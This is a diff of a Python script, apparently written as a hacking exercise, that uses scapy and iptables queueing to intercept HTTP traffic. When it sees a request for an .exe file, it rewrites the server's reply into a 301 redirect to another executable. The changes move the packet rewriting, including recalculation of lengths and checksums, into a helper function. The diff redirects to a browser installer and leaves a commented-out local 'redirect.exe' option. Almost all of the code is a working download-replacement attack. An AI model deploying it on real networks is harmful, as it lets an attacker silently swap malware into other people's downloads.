@@ -29,7 +29,7 @@ import scapy.all as scapy
 
 
 # REDIRECT = b'https://referrals.brave.com/latest/BraveBrowserSetup.exe'
-REDIRECT = b'10.0.2.15/redirect.exe'
+# REDIRECT = b'10.0.2.15/redirect.exe'
 
 
 ############################### Functions ############################### 
@@ -60,7 +60,21 @@ def reset_config():
     '''
     call('sudo iptables --flush', shell=True)
 
+
 ack_list = []
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+
+    # since now the packet has been tampered, the new 
+    # packet will have differet length and checksums
+    # so we'll delete these fields and scapy will 
+    # automatically calulate these for us.
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+
+    return packet
 
 def process_packet(packet):
     '''
@@ -83,31 +97,15 @@ def process_packet(packet):
                 print('[*] EXE Request Detected!')
                 ack_list.append(scapy_pkt[scapy.TCP].ack)
 
-            # if b".txt" in scapy_pkt[scapy.Raw].load:
-            #     print('[*] TXT Request Detected!')
-            #     ack_list.append(scapy_pkt[scapy.TCP].ack)
-            #     # print(scapy_pkt.show())
-            # print()
 
         elif scapy_pkt[scapy.TCP].sport == 80:
             if scapy_pkt[scapy.TCP].seq in ack_list:
                 print('[*] Replacing File!\n')
                 ack_list.remove(scapy_pkt[scapy.TCP].seq)
-                scapy_pkt[scapy.Raw].load = f"HTTP/1.1 301 Moved Permanently\nLocation: https://referrals.brave.com/latest/BraveBrowserSetup.exe \n\n"
-
-                # since now the packet has been tampered, the new 
-                # packet will have differet length and checksums
-                # so we'll delete these fields and scapy will 
-                # automatically calulate these for us.
-                del scapy_pkt[scapy.IP].len
-                del scapy_pkt[scapy.IP].chksum
-                del scapy_pkt[scapy.TCP].chksum
-                packet.set_payload(bytes(scapy_pkt))
-
-                # print(scapy_pkt.show())
-                # print(packet)
+                
+                modified_pkt = set_load(scapy_pkt, "HTTP/1.1 301 Moved Permanently\nLocation: https://referrals.brave.com/latest/BraveBrowserSetup.exe \n\n")
+                packet.set_payload(bytes(modified_pkt))
         
-
     packet.accept()
     
 
